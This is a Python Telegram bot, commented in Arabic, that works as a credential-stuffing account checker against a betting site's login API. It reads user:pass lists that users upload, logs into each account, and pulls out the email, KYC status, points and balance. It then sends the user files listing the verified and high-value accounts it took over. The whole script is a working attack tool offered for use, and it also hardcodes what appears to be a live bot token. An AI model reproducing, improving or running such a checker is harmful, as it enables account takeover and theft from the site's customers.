#!/usr/bin/env python3
import requests
import json
import os
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import telebot

# ----------------- إعدادات البوت -----------------
# ضع التوكن الخاص بـ BotFather هنا
BOT_TOKEN = "8606519407:AAG6QxZbjypnFwkEuizU3yb5JDzmPCPWVoc" 
bot = telebot.TeleBot(BOT_TOKEN)

# عدد الخيوط الثابت للفحص عبر التلجرام (يمكنك تعديله حسب رغبتك)
MAX_WORKERS = 2

# URLs الـ API
LOGIN_URL = "https://m.donbet.com/api/profile/login"
PROFILE_URL = "https://m.donbet.com/api/profile/p/getprofile"
WALLETS_URL = "https://m.donbet.com/api/profile/p/getwallets"
WALLET_INFO_URL = "https://m.donbet.com/api/profile/GetUserWalletInfo"

HEADERS = {
    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    'Content-Type': "application/json",
    'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
    'sec-ch-ua-mobile': "?1",
    'sec-ch-ua-platform': "\"Android\"",
    'origin': "https://m.donbet.com",
    'sec-fetch-site': "same-origin",
    'sec-fetch-mode': "cors",
    'sec-fetch-dest': "empty",
    'referer': "https://m.donbet.com/en",
    'accept-language': "en-US,en;q=0.9,ar;q=0.8"
}

def check_single_account(account, stats):
    """فحص حساب واحد وجلب بياناته"""
    username, password = account
    try:
        with requests.Session() as session:
            session.headers.update(HEADERS)
            
            login_payload = {
                "UserName": username.strip(),
                "Password": password.strip(),
                "ConfirmationStatus": None
            }
            
            login_resp = session.post(LOGIN_URL, data=json.dumps(login_payload), timeout=10)
            
            if login_resp.status_code == 200 and login_resp.json().get("status") == 1:
                profile_resp = session.get(PROFILE_URL, timeout=10)
                profile_data = profile_resp.json() if profile_resp.status_code == 200 else {}
                
                wallets_resp = session.get(WALLETS_URL, timeout=10)
                wallets_data = wallets_resp.json() if wallets_resp.status_code == 200 else []
                wallet_info = wallets_data[0] if wallets_data else {}
                
                wallet_info_resp = session.get(WALLET_INFO_URL, params={'CurrencyId': "302"}, timeout=10)
                wallet_info_data = wallet_info_resp.json() if wallet_info_resp.status_code == 200 else {}
                
                kyc_status = profile_data.get("KYCStatus", False)
                current_points = wallet_info_data.get("CurrentPointSum", 0.0)
                if current_points is None: current_points = 0.0
                
                balance = wallet_info.get("Balance", 0)
                balance_usd = wallet_info.get("BalanceUSD", 0.0)
                is_high_points = current_points > 100
                
                account_data = {
                    "login": username,
                    "password": password,
                    "user_name": profile_data.get("UserName", username),
                    "email": profile_data.get("Email", ""),
                    "kyc_status": kyc_status,
                    "current_points": current_points,
                    "total_points": wallet_info_data.get("TotalPointSum", 0.0),
                    "balance": balance,
                    "balance_usd": balance_usd,
                    "country_id": profile_data.get("CountryId", ""),
                    "created_date": profile_data.get("CreateDate", ""),
                }
                
                stats['checked'] += 1
                stats['valid'] += 1
                if kyc_status: stats['kyc_verified'] += 1
                if is_high_points: stats['high_points'] += 1
                    
                return (username, password, True, account_data, kyc_status, is_high_points)
            else:
                stats['invalid'] += 1
                stats['checked'] += 1
                return (username, password, False, None, False, False)
    except Exception:
        stats['invalid'] += 1
        stats['checked'] += 1
        return (username, password, False, None, False, False)

def update_progress_msg(bot, chat_id, message_id, stats, total):
    """تحديث رسالة التقدم للمستخدم في تليجرام كل ثانيتين"""
    while stats['checked'] < total and stats['is_running']:
        try:
            progress = (stats['checked'] / total) * 100
            msg = (f"🔄 *جاري فحص الحسابات...*\n\n"
                   f"📈 التقدم: {stats['checked']}/{total} ({progress:.1f}%)\n"
                   f"✅ صالحة: {stats['valid']}\n"
                   f"❌ خاطئة: {stats['invalid']}\n"
                   f"🆔 توثيق KYC: {stats['kyc_verified']}\n"
                   f"🪙 نقاط عـالية (>100): {stats['high_points']}")
            bot.edit_message_text(msg, chat_id, message_id, parse_mode="Markdown")
        except Exception:
            pass
        time.sleep(3)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "👋 مرحباً بك في بوت فحص حسابات *DONBET*!\n\nقم بإرسال ملف الحسابات بصيغة `.txt` يحتوي على الحسابات بتنسيق `user:pass` وسأقوم بفحصها وإرسال النتيجة لك.", parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def handle_accounts_file(message):
    # التحقق من أن الملف نصي
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ عذراً، يرجى إرسال ملف نصي ينتهي بـ `.txt` فقط.")
        return

    status_msg = bot.reply_to(message, "⏳ جاري تحميل الملف وقراءة الحسابات...")
    
    try:
        # تحميل الملف من سيرفرات تليجرام
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # قراءة الحسابات وتصفيتها
        accounts = []
        lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
        for line in lines:
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    accounts.append((parts[0].strip(), parts[1].strip()))
                    
        total = len(accounts)
        if total == 0:
            bot.edit_message_text("❌ لم يتم العثور على أي حسابات بالتنسيق الصحيح `user:pass` داخل الملف.", message.chat.id, status_msg.message_id)
            return
            
        bot.edit_message_text(f"📊 تم العثور على {total} حساب. جاري بدء الفحص بـ {MAX_WORKERS} خيوط...", message.chat.id, status_msg.message_id)
        
        # إنشاء إحصائيات مخصصة لهذا الفحص (لكي لا تتداخل طلبات المستخدمين)
        stats = {
            'valid': 0, 'invalid': 0, 'kyc_verified': 0, 'high_points': 0,
            'checked': 0, 'is_running': True
        }
        
        # بدء خيط لتحديث رسالة التقدم في تليجرام
        progress_thread = threading.Thread(target=update_progress_msg, args=(bot, message.chat.id, status_msg.message_id, stats, total), daemon=True)
        progress_thread.start()
        
        # تسمية ملفات المخرجات المؤقتة لكل مستخدم بشكل فريد
        user_id = message.from_user.id
        kyc_file_path = f"kyc_verified_{user_id}.txt"
        points_file_path = f"high_points_{user_id}.txt"
        detailed_file_path = f"detailed_report_{user_id}.txt"
        
        # بدء الفحص المتوازي
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            future_to_account = {executor.submit(check_single_account, acc, stats): acc for acc in accounts}
            
            for future in as_completed(future_to_account):
                try:
                    username, password, is_valid, account_data, is_kyc, is_high_points = future.result()
                    if is_valid and account_data:
                        line = f"{username}:{password} | KYC={account_data['kyc_status']} | Points={account_data['current_points']} | Balance={account_data['balance']} | Email={account_data['email']}\n"
                        
                        # حفظ النقاط العالية
                        if is_high_points:
                            with open(points_file_path, 'a', encoding='utf-8') as f:
                                f.write(line)
                                
                        # حفظ حسابات KYC الموثقة
                        if is_kyc:
                            with open(kyc_file_path, 'a', encoding='utf-8') as f:
                                f.write(line)
                                
                            # حفظ التقرير المفصل
                            with open(detailed_file_path, 'a', encoding='utf-8') as f:
                                f.write("=" * 50 + "\n")
                                f.write(f"✅ الحساب: {username}:{password}\n")
                                f.write(f"👤 المستخدم: {account_data['user_name']} | 📧 البريد: {account_data['email']}\n")
                                f.write(f"🆔 توثيق الـ KYC: محلول ✅\n")
                                f.write(f"🪙 النقاط الحالية: {account_data['current_points']} | الكلية: {account_data['total_points']}\n")
                                f.write(f"💰 الرصيد: {account_data['balance']} ({account_data['balance_usd']}$)\n")
                                f.write("=" * 50 + "\n\n")
                except:
                    pass
                    
        # إيقاف خيط التقدم وإرسال النتيجة النهائية
        stats['is_running'] = False
        bot.delete_message(message.chat.id, status_msg.message_id)
        
        # إرسال تقرير نصي نهائي للمستخدم
        summary = (f"🏁 *اكتمل فحص الملف بنجاح!*\n\n"
                   f"📊 إجمالي الحسابات: {total}\n"
                   f"✅ الشغالة: {stats['valid']}\n"
                   f"❌ الخاطئة: {stats['invalid']}\n\n"
                   f"🆔 حسابات توثيق KYC: {stats['kyc_verified']}\n"
                   f"🪙 حسابات نقاط > 100: {stats['high_points']}\n\n"
                   f"👇 الملفات المستخرجة تجدها أدناه:")
        bot.send_message(message.chat.id, summary, parse_mode="Markdown")
        
        # إرسال الملفات المستخرجة إذا كانت تحتوي على بيانات
        if os.path.exists(kyc_file_path):
            with open(kyc_file_path, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="🆔 ملف الحسابات الموثقة (KYC)")
            os.remove(kyc_file_path)
            
        if os.path.exists(points_file_path):
            with open(points_file_path, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="🪙 ملف الحسابات ذات النقاط العالية (>100)")
            os.remove(points_file_path)
            
        if os.path.exists(detailed_file_path):
            with open(detailed_file_path, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="📄 التقرير المفصل للحسابات الناجحة")
            os.remove(detailed_file_path)
            
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ حدث خطأ أثناء معالجة الملف: {str(e)}")

if __name__ == "__main__":
    print("🤖 البوت يعمل الآن بنجاح ومستعد لاستقبال الملفات...")
    bot.infinity_polling()
    
